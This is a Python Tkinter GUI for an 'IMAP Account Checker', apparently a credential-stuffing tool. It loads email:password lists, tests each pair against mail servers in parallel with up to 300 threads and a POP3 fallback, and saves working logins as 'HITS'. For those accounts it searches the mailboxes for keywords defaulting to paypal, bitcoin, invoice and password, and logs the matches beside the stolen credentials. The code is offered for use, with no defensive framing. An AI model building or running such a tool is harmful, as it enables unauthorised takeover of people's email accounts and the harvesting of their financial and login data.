#!/usr/bin/env python3
"""
IMAP Checker — Tkinter GUI
Controls checker.py via a graphical interface.
"""

import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import platform
import subprocess
from pathlib import Path
from datetime import datetime

from checker import (get_imap_config, imap_login, search_keywords, safe_filename,
                     pop3_login, _is_imap_disabled, _pop3_host)

# ── Palette ───────────────────────────────────────────────────────────────────
BG      = "#12121f"
PANEL   = "#1a1a2e"
FIELD   = "#0f3460"
GREEN   = "#4ecca3"
RED     = "#e94560"
YELLOW  = "#f5c518"
CYAN    = "#00d4ff"
FG      = "#eaeaea"
DIM     = "#555577"
CONSOLE = "#090912"
BTN_S   = "#00b894"
BTN_X   = "#c0392b"
BTN_N   = "#2c3e50"

FONT      = ("Consolas", 10)
FONT_BOLD = ("Consolas", 10, "bold")
FONT_BIG  = ("Consolas", 14, "bold")


class Placeholder(tk.Entry):
    """Entry that shows greyed placeholder text when empty."""
    def __init__(self, master, placeholder="", **kw):
        super().__init__(master, **kw)
        self._ph = placeholder
        self._active = False
        self._show_ph()
        self.bind("<FocusIn>",  self._on_focus_in)
        self.bind("<FocusOut>", self._on_focus_out)

    def _show_ph(self):
        self.config(fg=DIM)
        self.delete(0, "end")
        self.insert(0, self._ph)
        self._active = False

    def _on_focus_in(self, _):
        if not self._active:
            self.delete(0, "end")
            self.config(fg=FG)
            self._active = True

    def _on_focus_out(self, _):
        if not self.get():
            self._show_ph()

    def real_value(self):
        return self.get() if self._active else ""


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("IMAP Account Checker")
        self.configure(bg=BG)
        self.minsize(720, 580)

        self._lock       = threading.Lock()
        self._stop_ev    = threading.Event()
        self._running    = False
        self._stats      = {}
        self._total      = 0
        self._checked    = 0
        self._start_ts   = None
        self._run_dir    = None
        self._log_buf    = []
        self._log_lock   = threading.Lock()

        self._build_ui()
        self._tick()

    # ── UI construction ──────────────────────────────────────────────────────

    def _build_ui(self):
        # ── Header
        tk.Label(self, text="IMAP Account Checker", bg=BG, fg=CYAN,
                 font=("Consolas", 15, "bold"), pady=8).pack(fill="x", padx=14)

        # ── Config panel
        cfg = tk.Frame(self, bg=PANEL, padx=14, pady=10)
        cfg.pack(fill="x", padx=12, pady=(0, 6))
        cfg.columnconfigure(1, weight=1)

        def lbl(text, row):
            tk.Label(cfg, text=text, bg=PANEL, fg=FG, font=FONT,
                     anchor="w", width=14).grid(row=row, column=0, sticky="w", pady=3)

        # Accounts file
        lbl("Accounts:", 0)
        self._inp_var = tk.StringVar()
        tk.Entry(cfg, textvariable=self._inp_var, bg=FIELD, fg=FG,
                 insertbackground=FG, font=FONT, relief="flat"
                 ).grid(row=0, column=1, sticky="ew", padx=(0, 6))
        tk.Button(cfg, text="Browse", bg=BTN_N, fg=FG, font=FONT, relief="flat",
                  padx=8, cursor="hand2",
                  command=lambda: self._pick_file(self._inp_var)
                  ).grid(row=0, column=2)

        # Output dir
        lbl("Output dir:", 1)
        self._out_var = tk.StringVar(value="results")
        tk.Entry(cfg, textvariable=self._out_var, bg=FIELD, fg=FG,
                 insertbackground=FG, font=FONT, relief="flat"
                 ).grid(row=1, column=1, sticky="ew", padx=(0, 6))
        tk.Button(cfg, text="Browse", bg=BTN_N, fg=FG, font=FONT, relief="flat",
                  padx=8, cursor="hand2",
                  command=lambda: self._pick_dir(self._out_var)
                  ).grid(row=1, column=2)

        # Run name
        lbl("Run name:", 2)
        self._name_e = Placeholder(cfg, placeholder="(timestamp automatique)",
                                   bg=FIELD, fg=FG, insertbackground=FG,
                                   font=FONT, relief="flat")
        self._name_e.grid(row=2, column=1, sticky="ew", padx=(0, 6), columnspan=2)

        # Keywords
        lbl("Keywords:", 3)
        self._kw_e = Placeholder(cfg, placeholder="paypal,bitcoin,invoice,password",
                                 bg=FIELD, fg=FG, insertbackground=FG,
                                 font=FONT, relief="flat")
        self._kw_e.grid(row=3, column=1, sticky="ew", padx=(0, 6), columnspan=2)

        # Threads + Timeout
        row4 = tk.Frame(cfg, bg=PANEL)
        row4.grid(row=4, column=0, columnspan=3, sticky="w", pady=(6, 0))
        tk.Label(row4, text="Threads:", bg=PANEL, fg=FG, font=FONT).pack(side="left")
        self._thr_var = tk.StringVar(value="10")
        tk.Spinbox(row4, from_=1, to=300, textvariable=self._thr_var, width=5,
                   bg=FIELD, fg=FG, insertbackground=FG, buttonbackground=FIELD,
                   font=FONT).pack(side="left", padx=(4, 20))
        tk.Label(row4, text="Timeout (s):", bg=PANEL, fg=FG, font=FONT).pack(side="left")
        self._to_var = tk.StringVar(value="10")
        tk.Spinbox(row4, from_=3, to=120, textvariable=self._to_var, width=5,
                   bg=FIELD, fg=FG, insertbackground=FG, buttonbackground=FIELD,
                   font=FONT).pack(side="left", padx=4)

        # ── Buttons
        bf = tk.Frame(self, bg=BG)
        bf.pack(fill="x", padx=12, pady=4)

        self._btn_start = tk.Button(bf, text="▶  START", bg=BTN_S, fg="white",
                                    font=FONT_BOLD, relief="flat", padx=18, pady=7,
                                    cursor="hand2", command=self._start)
        self._btn_start.pack(side="left", padx=(0, 8))

        self._btn_stop = tk.Button(bf, text="■  STOP", bg=BTN_X, fg="white",
                                   font=FONT_BOLD, relief="flat", padx=18, pady=7,
                                   cursor="hand2", state="disabled", command=self._stop)
        self._btn_stop.pack(side="left", padx=(0, 8))

        tk.Button(bf, text="📂  Open results", bg=BTN_N, fg=FG, font=FONT,
                  relief="flat", padx=12, pady=7, cursor="hand2",
                  command=self._open_results).pack(side="left", padx=(0, 8))

        tk.Button(bf, text="🗑  Clear console", bg=BTN_N, fg=FG, font=FONT,
                  relief="flat", padx=12, pady=7, cursor="hand2",
                  command=self._clear_console).pack(side="left")

        # ── Stats bar
        sb = tk.Frame(self, bg=PANEL, padx=10, pady=8)
        sb.pack(fill="x", padx=12, pady=(2, 0))

        self._hits_v  = tk.StringVar(value="0")
        self._inv_v   = tk.StringVar(value="0")
        self._unk_v   = tk.StringVar(value="0")
        self._tot_v   = tk.StringVar(value="0/0")
        self._time_v  = tk.StringVar(value="0s")

        for label, var, color in [
            ("HITS",    self._hits_v, GREEN),
            ("Invalid", self._inv_v,  RED),
            ("Unknown", self._unk_v,  YELLOW),
            ("Total",   self._tot_v,  CYAN),
            ("Time",    self._time_v, DIM),
        ]:
            f = tk.Frame(sb, bg=PANEL)
            f.pack(side="left", padx=14)
            tk.Label(f, text=label, bg=PANEL, fg=DIM, font=("Consolas", 8)).pack()
            tk.Label(f, textvariable=var, bg=PANEL, fg=color, font=FONT_BIG).pack()

        # ── Progress bar
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("imap.Horizontal.TProgressbar",
                        background=GREEN, troughcolor=FIELD, borderwidth=0, relief="flat")
        self._prog_v = tk.DoubleVar(value=0)
        ttk.Progressbar(self, variable=self._prog_v, maximum=100,
                        style="imap.Horizontal.TProgressbar",
                        ).pack(fill="x", padx=12, pady=(4, 0))

        # ── Console
        tk.Label(self, text=" Console output", bg=BG, fg=DIM,
                 font=("Consolas", 9), anchor="w").pack(fill="x", padx=12, pady=(4, 0))

        self._console = scrolledtext.ScrolledText(
            self, bg=CONSOLE, fg=FG, font=("Consolas", 10),
            insertbackground=FG, relief="flat", padx=8, pady=8,
            state="disabled"
        )
        self._console.pack(fill="both", expand=True, padx=12, pady=(0, 12))

        self._console.tag_config("hit",  foreground=GREEN)
        self._console.tag_config("bad",  foreground=RED)
        self._console.tag_config("unk",  foreground=YELLOW)
        self._console.tag_config("info", foreground=CYAN)
        self._console.tag_config("dim",  foreground=DIM)
        self._console.tag_config("kw",   foreground="#b8a9ff")

    # ── Helpers ───────────────────────────────────────────────────────────────────

    def _pick_file(self, var):
        p = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if p:
            var.set(p)

    def _pick_dir(self, var):
        p = filedialog.askdirectory()
        if p:
            var.set(p)

    def _open_results(self):
        path = Path(self._out_var.get() or "results")
        if self._run_dir and self._run_dir.exists():
            path = self._run_dir
        if not path.exists():
            path.mkdir(parents=True, exist_ok=True)
        sys = platform.system()
        if sys == "Windows":
            subprocess.Popen(f'explorer "{path}"')
        elif sys == "Darwin":
            subprocess.Popen(["open", str(path)])
        else:
            subprocess.Popen(["xdg-open", str(path)])

    def _clear_console(self):
        self._console.config(state="normal")
        self._console.delete("1.0", "end")
        self._console.config(state="disabled")

    def _log(self, msg: str, tag: str = ""):
        with self._log_lock:
            self._log_buf.append((msg, tag))

    def _tick(self):
        # Flush log buffer to console
        with self._log_lock:
            buf, self._log_buf = self._log_buf, []
        if buf:
            self._console.config(state="normal")
            for msg, tag in buf:
                self._console.insert("end", msg + "\n", tag or ())
            self._console.see("end")
            self._console.config(state="disabled")

        # Update stats
        with self._lock:
            h = self._stats.get("hits", 0)
            i = self._stats.get("invalids", 0)
            u = self._stats.get("unknown", 0)
            c = self._checked

        self._hits_v.set(str(h))
        self._inv_v.set(str(i))
        self._unk_v.set(str(u))
        self._tot_v.set(f"{c}/{self._total}")
        if self._start_ts:
            self._time_v.set(f"{int(time.time() - self._start_ts)}s")
        if self._total > 0:
            self._prog_v.set(c / self._total * 100)

        self.after(100, self._tick)

    # ── Start / Stop ───────────────────────────────────────────────────────────────

    def _start(self):
        inp = self._inp_var.get().strip()
        if not inp or not Path(inp).exists():
            self._log("ERROR: fichier introuvable.", "bad")
            return

        lines = [l for l in Path(inp).read_text(errors="replace").splitlines()
                 if l.strip() and ":" in l]
        if not lines:
            self._log("ERROR: aucune ligne email:password valide.", "bad")
            return

        out_base = self._out_var.get().strip() or "results"
        run_name = self._name_e.real_value().strip() or \
                   datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        kw_raw   = self._kw_e.real_value().strip()
        keywords = [k.strip() for k in kw_raw.split(",") if k.strip()]

        try:
            threads = max(1, int(self._thr_var.get()))
            timeout = max(3, int(self._to_var.get()))
        except ValueError:
            threads, timeout = 10, 10

        run_dir = Path(out_base) / run_name
        run_dir.mkdir(parents=True, exist_ok=True)
        self._run_dir = run_dir

        kw_dir = run_dir / "keywords" if keywords else None
        if kw_dir:
            kw_dir.mkdir(exist_ok=True)

        # Reset
        self._stats    = {"hits": 0, "invalids": 0, "unknown": 0}
        self._total    = len(lines)
        self._checked  = 0
        self._start_ts = time.time()
        self._stop_ev.clear()
        self._running  = True
        self._prog_v.set(0)

        self._clear_console()
        self._log(f"Run dir : {run_dir}", "info")
        self._log(f"Comptes : {len(lines)}  |  Threads : {threads}  |  Timeout : {timeout}s", "info")
        if keywords:
            self._log(f"Keywords: {', '.join(keywords)}", "info")
        self._log("─" * 64, "dim")

        self._btn_start.config(state="disabled")
        self._btn_stop.config(state="normal")

        threading.Thread(
            target=self._worker,
            args=(lines, keywords, threads, timeout, run_dir, kw_dir),
            daemon=True
        ).start()

    def _stop(self):
        self._stop_ev.set()
        self._log("Arrêt demandé — attente des checks en cours...", "unk")
        self._btn_stop.config(state="disabled")

    def _worker(self, lines, keywords, threads, timeout, run_dir, kw_dir):
        hits_path     = run_dir / "hits.txt"
        invalids_path = run_dir / "invalids.txt"

        kw_files = {}
        if kw_dir:
            for kw in keywords:
                kw_files[kw] = open(kw_dir / f"{safe_filename(kw)}.txt",
                                    "w", encoding="utf-8")

        file_lock = threading.Lock()

        def process(line, idx):
            if self._stop_ev.is_set():
                with self._lock:
                    self._checked += 1
                return

            line = line.strip()
            if not line or ":" not in line:
                with self._lock:
                    self._checked += 1
                return

            email, _, password = line.partition(":")
            email    = email.strip()
            password = password.strip()
            if not email or not password or "@" not in email:
                with self._lock:
                    self._checked += 1
                return

            domain, cfg = get_imap_config(email)
            prefix = f"[{idx}/{self._total}]"

            if cfg is None:
                self._log(f"{prefix} UNKNOWN  {email}  (pas de serveur pour {domain})", "unk")
                with self._lock:
                    self._stats["unknown"] += 1
                    self._checked += 1
                return

            host, port = cfg["host"], cfg["port"]
            ok, err    = imap_login(host, port, email, password, timeout)

            # POP3 fallback when IMAP is structurally disabled
            proto = "IMAP"
            pop3_host_used = None
            if not ok and _is_imap_disabled(err):
                ph = _pop3_host(host, domain)
                if ph:
                    pop3_ok, _ = pop3_login(ph, 995, email, password, timeout)
                    if pop3_ok:
                        ok, err, proto, pop3_host_used = True, None, "POP3", ph

            with self._lock:
                self._checked += 1

            if ok:
                with self._lock:
                    self._stats["hits"] += 1
                    hits = self._stats["hits"]

                used_host = pop3_host_used or host
                self._log(f"{prefix} HIT  {email}  [{used_host}|{proto}]  HITS:{hits}", "hit")
                with file_lock:
                    with open(hits_path, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}\n")

                if keywords and kw_files and proto == "IMAP":
                    found = search_keywords(host, port, email, password,
                                            keywords, timeout + 10)
                    if found:
                        counts: dict[str, int] = {}
                        with file_lock:
                            for m in found:
                                fh = kw_files.get(m["keyword"])
                                if fh:
                                    fh.write(
                                        f"{email}:{password} | {m['folder']} | "
                                        f"FROM: {m['from']} | SUBJ: {m['subject']}\n"
                                    )
                                    fh.flush()
                                counts[m["keyword"]] = counts.get(m["keyword"], 0) + 1
                        summary = "  ".join(f"[{k}:{v}]" for k, v in counts.items())
                        self._log(f"    ↳ {summary}", "kw")
            else:
                with self._lock:
                    self._stats["invalids"] += 1
                self._log(f"{prefix} INVALID  {email}  ({err})", "bad")
                with file_lock:
                    with open(invalids_path, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}\n")

        with ThreadPoolExecutor(max_workers=threads) as pool:
            futs = {pool.submit(process, l, i + 1): l
                    for i, l in enumerate(lines)}
            for fut in as_completed(futs):
                try:
                    fut.result()
                except Exception as e:
                    self._log(f"Worker error: {e}", "bad")

        for fh in kw_files.values():
            fh.close()

        elapsed = int(time.time() - self._start_ts)
        with self._lock:
            h = self._stats["hits"]
            i = self._stats["invalids"]
            u = self._stats["unknown"]
        self._log("─" * 64, "dim")
        self._log(f"Terminé en {elapsed}s  |  HITS: {h}  |  Invalid: {i}  |  Unknown: {u}", "info")
        self._log(f"Résultats: {run_dir}", "dim")

        self._running = False
        self.after(0, lambda: self._btn_start.config(state="normal"))
        self.after(0, lambda: self._btn_stop.config(state="disabled"))


if __name__ == "__main__":
    App().mainloop()
